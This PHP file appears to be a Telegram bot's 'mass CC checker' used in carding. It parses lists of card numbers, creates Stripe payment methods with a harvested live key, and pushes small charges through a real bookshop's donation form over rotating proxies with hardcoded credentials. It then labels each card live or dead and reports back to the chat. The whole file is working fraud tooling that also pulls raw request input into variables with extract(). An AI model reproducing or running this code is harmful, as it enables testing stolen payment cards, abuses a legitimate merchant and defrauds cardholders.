<?php

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mchk") === 0 || strpos($message, "!mchk") === 0 || strpos($message, ".mchk") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 1;
    if (count($aray) > 5){
  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟱 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=be0fe53a-b78b-424a-9d10-1fddbe18841b5ff1d1&sid=7dc6005f-5847-4d65-af36-05168c9ed9415b819c&payment_user_agent=stripe.js%2F3473ef1508%3B+stripe-js-v3%2F3473ef1508%3B+card-element&referrer=https%3A%2F%2Falderhousebooks.com&time_on_page=50582&key=pk_live_51L3ZT9FhVbvAJQfp7SmRYH9FmKBwinBkH2DJlYqiJTK57Ep2pH5UwWFZoDyvvWs0oyXFJ7FY9rLZ84aXXGxV69f900owhP7e20');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://alderhousebooks.com/wp-admin/admin-ajax.php?t=1712618145893');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1712618145893 h2',
'Host: alderhousebooks.com',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://alderhousebooks.com',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://alderhousebooks.com/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D475%26_fluentform_6_fluentformnonce%3D32cef227a1%26_wp_http_referer%3D%252Fdonate%252F%26payment_input%3DOther%26custom_donation_amount%3D10%26checkbox_1%255B%255D%3DKeep%2520Donation%2520Anonymous%26phone%3D%26email%3Dgloosmoke%2540gmail.com%26address1%255Baddress_line_1%255D%3DStreet%252027%26address1%255Baddress_line_2%255D%3D%26address1%255Bcity%255D%3DNew%2520York%26address1%255Bstate%255D%3DNY%26address1%255Bzip%255D%3D10014%26address1%255Bcountry%255D%3D%26payment_method%3Dstripe%26alt_s%3D%26itmopb458%3D72082%26__entry_intermediate_hash%3Db32bad205ba9b57240825bd63e18ee38%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=6');

$result2a = curl_exec($ch);

$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

curl_close($ch);

if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
      $status = "Live 🟡";
      $response = "Zip Mismatch ❎";
    }


elseif (strpos($result2a, "CVV LIVE")){
  $status = "Live 🟢";
$response = "CVV Matched ✅";
  }
elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
  $status = "CVV Live 🟢";
$response = "INSUFFICIENT FUNDS ✅";

  }
elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
  $status = "Live 🟡";
$response = "CCN Live ❎";

  }
elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
  $status = "Live 🟡";
$response = "TRANSACTION NOT ALLOWED";

  }

elseif (strpos($result2a, "DO NOT HONOR")){
  
$status = "Dead 🔴";
$response = "DO NOT HONOR 🚫";
}

elseif (strpos($result2a, "stolen_card")){
  
$status = "Dead 🔴";
$response = "Stolen Card 🚫";
}

elseif (strpos($result2a, "lost_card")){
  $status = "Dead 🔴";
$response = "Lost Card 🚫";
}


elseif (strpos($result2a, "PICKUP CARD")){
  $status = "Dead 🔴";
$response = "PICKUP CARD";
}


elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
  
  $status = "Dead 🔴";
$response = "Incorrect Card Number 🚫";
}


elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
  $status = "Dead 🔴";
$response = "Expired Card 🚫";

  }


elseif (strpos($result2a, 'Thank you for your generosity!')){
  $status = "Live 🟢";
$response = "Charged 1$ ✅";

  }


elseif (strpos($result2a, "FRAUDULENT")){
  $status = "Dead 🔴";
$response = "Fraudulent 🚫";
}


elseif (strpos($result2a, "lock_timeout")){
  $status = "Dead 🔴";
$response = "error 404 🚫";
}


elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
  $status = "Dead 🔴";
$response = "Generic Decline 🚫";
}


elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
  $status = "Dead 🔴";
$response = "NVAILD EXPIRY MONTH 😥";
}



elseif (strpos($result2a, "Error processing payment")){
  $status = "Dead 🔴";
$response = "Error processing payment";
}

elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
  $status = "Live 🟡";
$response = "CARD NOT SUPPORTED 🚫";
}


elseif (strpos($result2a, "parameter_invalid_empty")){
  $status = "Dead 🔴";
$response = "404 error 🚫";
}

else {
      $status = "Dead 🔴";
$response = "Payment Error 🚫";

    }
//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  MASS CCN CHARGE 1 $  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
